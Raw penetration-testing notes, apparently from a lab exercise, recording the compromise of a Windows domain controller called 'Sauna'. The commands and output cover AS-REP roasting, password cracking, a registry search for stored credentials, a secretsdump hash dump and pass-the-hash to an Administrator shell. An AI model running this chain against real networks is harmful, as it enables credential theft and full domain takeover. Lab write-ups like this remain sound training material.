@@ -1,0 +1,558 @@
+# port scans 
+#basic 
+
+nmap -Pn 10.10.10.175
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-15 21:31 EST
+Nmap scan report for 10.10.10.175
+Host is up (0.097s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap done: 1 IP address (1 host up) scanned in 17.72 seconds
+
+# full scan
+
+nmap -sC -sV -Pn -p- 10.10.10.175
+
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-16 10:59:13Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  msrpc         Microsoft Windows RPC
+64562/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.70%I=7%D=2/15%Time=5E48AFB1%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8h01m24s, deviation: 0s, median: 8h01m24s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-02-16 06:01:33
+|_  start_date: N/A
+
+
+
+# port 80
+
+
+http://10.10.10.175/
+
+# contains a banks site 
+# go to any of the blog pages
+
+http://10.10.10.175/single.html
+
+# trying dearch we get an error:
+
+405 - HTTP verb used to access this page is not allowed.
+
+# can we send it with another verb to burp?
+
+# some scans in the background 
+
+nikto -h 10.10.10.175
+
++ Server: Microsoft-IIS/10.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ 7863 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2020-02-15 22:34:36 (GMT-5) (803 seconds)
+
+
+gobuster -w /usr/share/wordlists/dirb/common.txt -t 30 -x html,asp,php -u http://10.10.10.175 -o gobuster.txt
+
+
+/About.html (Status: 200)000000000000
+/about.html (Status: 200)
+/blog.html (Status: 200)
+/Blog.html (Status: 200)
+/Contact.html (Status: 200)
+/contact.html (Status: 200)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/Index.html (Status: 200)
+/Images (Status: 301)
+/single.html (Status: 200)
+
+# goes back the same page with a GET and HEAD instaead of a post 
+# try to gtather mor eusernames with CEWL
+
+cewl -d 5 http://10.10.10.175 -w cewl.txt
+
+http://10.10.10.175/about.html
+
+# found more users
+
+Fergus Smith
+Shaun Coins 
+Sophie Driver 
+Bowie Taylor 
+Hugo Bear
+Steven Kerb
+
+# try to make different combinations 
+
+Fergus.Smith
+Shaun.Coins 
+Sophie.Driver 
+Bowie.Taylor 
+Hugo.Bear 
+Steven.Kerb 
+
+F.Smith
+S.Coins
+S.Driver
+B.Taylor
+H.Bear
+S.Kerb
+
+
+
+## Port 139 SMB
+
+smbclient -L 10.10.10.175 -U "" -N
+
+do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+smbclient -L 10.10.10.175 -U "guest"%
+session setup failed: NT_STATUS_ACCOUNT_DISABLED
+
+# no go lets enum
+
+enum4linux -a 10.10.10.175 | tee enum4linux.txt
+
+# NT_STATUS_ACCESS_DENIED for everything 
+
+nmap -script=smb-vuln* -sV -Pn -p 139,445 --open 10.10.10.175
+# nothing 
+
+nmap -script=smb-vuln* -sV -Pn -p 139,445 --open 10.10.10.175 --script-args=unsafe
+#nothing 
+
+
+# POrt 80
+
+# found usernames on the website: Watson, Johnson, and Jane
+# try kerbrute
+
+python /opt/kerbrute.py -domain EGOTISTICAL-BANK.LOCAL -dc-ip 10.10.10.175 -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile sauna_passwords.txt
+
+# timed out 
+# try the users without a password
+
+smbclient -L 10.10.10.175 -U Watson -N 
+smbclient -L 10.10.10.175 -U Doe -N
+smbclient -L 10.10.10.175 -U Johnson -N 
+smbclient -L 10.10.10.175 -U Admin -N
+smbclient -L 10.10.10.175 -U James -N
+
+smbclient -L 10.10.10.175 -U Steven.Kerb -N
+smbclient -L 10.10.10.175 -U Hugo.Bear -N
+smbclient -L 10.10.10.175 -U Bowie.Taylor -N
+smbclient -L 10.10.10.175 -U Sophie.Driver -N
+smbclient -L 10.10.10.175 -U Shaun.Coins -N
+smbclient -L 10.10.10.175 -U Fergus.Smith -N
+
+smbclient -L 10.10.10.175 -U S.Kerb -N
+smbclient -L 10.10.10.175 -U H.Bear -N
+smbclient -L 10.10.10.175 -U B.Taylor -N
+smbclient -L 10.10.10.175 -U S.Driver -N
+smbclient -L 10.10.10.175 -U S.Coins -N
+smbclient -L 10.10.10.175 -U F.Smith -N
+
+smbclient -L 10.10.10.175 -U malesauda -N
+smbclient -L 10.10.10.175 -U Jenny -N
+
+
+Fergus.Smith
+Shaun.Coins
+Sophie.Driver
+Bowie.Taylor
+Hugo.Bear
+Steven.Kerb
+
+F.Smith
+S.Coins
+S.Driver
+B.Taylor
+H.Bear
+S.Kerb
+
+sauna?
+
+
+# try username as password
+
+# try to gather 
+
+
+
+
+# Port 88 Kerberos 
+
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’EGOTISTICAL-BANK.LOCAL’,userdb=users.txt 10.10.10.175
+
+nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’EGOTISTICAL-BANK.LOCAL’,userdb=users.txt 10.10.10.175
+
+msf > use Auxiliary/gather/Kerberos_enumusers
+set DOMAIN <DOMAIN>
+set RHOSTS <IP_ADDRESS>
+set USER_FILE <USERS_FILE>
+
+# none of these worked with the current list 
+
+
+python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile users.txt -format john -outputfile Sauna_hashes.txt
+
+# none of the usernames are correct??
+# try to make a list with cewl 
+
+# now run that through 
+
+[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+# but the user does require preauth??
+# got it !!!!!
+
+cewl -d 2 -m 5 -w docswords.txt http://10.10.10.175/index.html
+
+python /opt/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile docswords.txt -format john -outputfile Sauna_hashes.txt
+
+try login stuff again?
+
+smbclient -L 10.10.10.175 -U Sauna -N
+session setup failed: NT_STATUS_LOGON_FAILURE
+
+# username does not work as password 
+
+
+
+# check out this site for hinst on how to combine usernames
+
+https://activedirectorypro.com/active-directory-user-naming-convention/
+
+FSmith exists!!!
+
+
+$krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL:26dce2496172a25278f91a7a33b16d54$fae5ff8764f66858ce4d5ff9825762cfaefdfc191d731011be1b8c77e81286e66861b403b98ffb3714475b0a45cba8cf79ec603514bcc3e3fb3483d3146b12a4125d76698c36f5c9d6c528e7f7215afb48a1cb3e3f8c5f232dc183fd66eb01ca4c6b95daa2be489fabdc4f1763e934307e87c052e5233ac9bd71d0c5c7461b85c9d0928b3fc24b976490d72838695daee5e44700f98aecea24f995666d157c3762d2982a4995260018a40703f6e37168b3723d4e85219e73d03d54f3c3834007d4eea1f943fd87d708d7d58a2ae6407c00ba1bc1eb9cff700aa8bad7d29f8110f36e6ba20ec47a42ac0400c724fa5bd8910222132d5d257d4f4ea83aa5df937d
+
+# rerun to verify 
+
+python /opt/kerbrute.py -domain EGOTISTICAL-BANK.LOCAL -dc-ip 10.10.10.175 -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile sauna_passwords.txt
+[*] Valid user => sauna
+[*] Valid user => FSmith [NOT PREAUTH]
+
+# boom now go after the hash with john
+
+john --format:krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt forest_hashes.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
+1g 0:00:00:14 DONE (2020-02-16 15:18) 0.06944g/s 731875p/s 731875c/s 731875C/s Thrall..Thehunter22
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+# lets login 
+
+smbclient -L 10.10.10.175 -U FSmith%Thestrokes23 
+
+# works 
+
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	print$          Disk      Printer Drivers
+	RICOH Aficio SP 8300DN PCL 6 Printer   We cant print money
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+# what do we have access to 
+
+smbmap -H 10.10.10.175 -u FSmith -p Thestrokes23
+
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.175...
+[+] IP: 10.10.10.175:445	Name: 10.10.10.175                                      
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	IPC$                                              	READ ONLY
+	NETLOGON                                          	READ ONLY
+	print$                                            	READ ONLY
+	RICOH Aficio SP 8300DN PCL 6                      	NO ACCESS
+	SYSVOL                                            	READ ONLY
+
+# ok lets list the contents of the directories we can access 
+
+smbmap -R print$ -H 10.10.10.175 -u FSmith -p Thestrokes23  
+
+# see prin$ file
+
+smbmap -R NETLOGON -H 10.10.10.175 -u FSmith -p Thestrokes23
+
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.175...
+[+] IP: 10.10.10.175:445	Name: 10.10.10.175                                      
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	NETLOGON                                          	READ ONLY
+	.\
+
+smbmap -R SYSVOL -H 10.10.10.175 -u FSmith -p Thestrokes23
+
+# now that we have creds try winrm 
+
+
+PS > date; whoami; cat ..\Desktop\user.txt; ipconfig
+
+Sunday, February 16, 2020 8:54:57 PM
+egotisticalbank\fsmith
+1b5520b98d97cf17f24122a55baf70cf
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : dead:beef::8d92:45de:a76c:d59a
+   Link-local IPv6 Address . . . . . : fe80::8d92:45de:a76c:d59a%8
+   IPv4 Address. . . . . . . . . . . : 10.10.10.175
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:febd:e2c6%8
+                                       10.10.10.2
+
+
+### Privesc 
+
+# dump the hashes...
+python secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/FSmith@10.10.10.175
+
+Thestrokes23
+
+[-] DRSR SessionError: code: 0x20f7
+
+python secretsdump.py EGOTISTICAL-BANK.LOCAL/FSmith@10.10.10.175
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+
+# use-vss optin did not work, tried to downgrade the version but still issues 
+
+PS > net user /domain fsmith    
+User name                    FSmith
+Full Name                    Fergus Smith
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/23/2020 9:45:19 AM
+Password expires             Never
+Password changeable          1/24/2020 9:45:19 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   1/24/2020 4:27:55 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         
+The command completed successfully.
+
+# fsmith is a domain user! 
+# registry keys where I can find user credentials?
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
+
+reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
+reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
+
+# look at this for autologin information: 
+
+PS > reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DefaultDomainName    REG_SZ    EGOTISTICALBANK
+    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ    
+    LegalNoticeText    REG_SZ    
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x303697c4
+    ShutdownFlags    REG_DWORD    0x13
+    DisableLockWorkstation    REG_DWORD    0x0
+    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AlternateShells
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\UserDefaults
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\VolatileUserMgrKey
+
+svc_loanmanager
+Moneymakestheworldgoround!
+# creds do not work
+
+
+PS > net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest                    
+HSmith                   krbtgt                   svc_loanmgr              
+The command completed with one or more errors.
+
+# this matches the user in net user 
+svc_loanmgr 
+Moneymakestheworldgoround!
+
+smbclient -L 10.10.10.175 -U svc_loanmgr
+Enter WORKGROUP\svc_loanmgr's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	print$          Disk      Printer Drivers
+	RICOH Aficio SP 8300DN PCL 6 Printer   We cant print money
+	SYSVOL          Disk      Logon server share 
+
+# works 
+# grab the latest berison of impacket
+# install impacket from the root director 
+
+pip install . 
+
+
+python secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175
+
+Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a7689cc5799cdee8ace0c7c880b1efe3:::
+[*] Cleaning up... 
+
+
+
+# now lets pass the hash with psexec
+
+python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175
+
+# success
+
+Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+
+
+
+C:\Users\Administrator\Desktop>type root.txt
+f3ee04965c68257382e31502cc5e881f
+
+
+# time for a writeup
+
+
